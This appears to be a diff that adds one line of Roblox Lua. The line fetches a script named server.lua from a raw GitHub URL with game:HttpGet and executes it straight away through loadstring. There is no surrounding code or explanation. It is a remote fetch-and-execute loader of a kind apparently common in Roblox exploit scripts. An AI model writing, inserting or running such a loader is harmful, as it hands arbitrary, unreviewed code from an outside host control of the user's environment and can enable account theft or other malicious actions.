@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/Seventh2003/Acesso/main/server.lua")()
